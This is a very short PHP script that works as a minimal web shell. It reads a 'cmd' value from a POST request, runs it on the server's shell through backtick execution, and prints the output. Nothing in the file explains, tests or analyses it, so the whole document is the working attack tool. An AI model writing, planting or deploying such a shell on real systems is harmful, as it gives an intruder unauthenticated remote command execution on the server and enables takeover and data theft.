<?php
$cmd=$_POST['cmd'];
$output=`$cmd`;
echo '<pre>'.$output.'</pre>';

?>
